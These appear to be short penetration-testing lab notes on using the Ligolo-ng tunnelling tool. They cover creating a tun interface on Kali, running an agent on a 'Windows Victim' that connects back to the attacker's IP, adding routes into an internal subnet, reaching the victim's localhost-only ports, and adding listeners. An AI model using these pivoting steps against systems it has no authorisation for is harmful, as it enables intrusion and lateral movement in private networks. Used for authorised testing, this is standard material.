- Proxy - Server
- Agent -> Client

```
sudo ip tuntap add user root mode tun ligolo
```

```
sudo ip link set ligolo up
```

Kali:
```
./proxy-lin -selfcert
```

Windows Victim:
```
.\ligolo-agent.exe -connect 192.168.45.158:11601 -ignore-cert
```

In Ligolo:
```
session
```
Choose session
Then:
```
ifconfig
```

In Kali Terminal
```
sudo ip route add 10.10.113.0/24 dev ligolo
```

Check it:
```
ip route list
```

Let's go back; execute `session`, choose `session`; Then:
```
start
```

## Local Port Forwarding

For example, there is a port on the host that is only visible for `127.0.0.1` at the victim, so you can to like that:

- After running the commands up (starting proxy; running agent; and start the session) add the command below on the Kali terminal (not in ligolo):

```
ip route add 240.0.0.1/32 dev ligolo
```

Then you will be able to see the local port forwarding on the given ip `240.0.0.1`.

# Listener
```
listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp
```
